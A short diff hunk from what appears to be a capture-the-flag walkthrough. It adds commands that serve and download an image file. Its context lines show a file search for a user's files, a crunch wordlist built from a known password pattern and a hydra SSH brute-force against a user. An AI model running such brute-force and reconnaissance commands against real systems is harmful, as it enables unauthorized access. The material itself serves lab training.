@@ -86,6 +86,10 @@ $  find / -user peppermint-butler -name "*.txt" 2>/dev/null
 
 $  cat /etc/php/zip.txt
 
+$ python3 -m http.server
+
+$ wget http://<ip>:8000/butler-1.jpg
+
 $  crunch 18 18 -t 'The Ice King s@@@@' > file.txt
 
 $  sudo hydra -l gunter -P file.txt ssh://<IP>
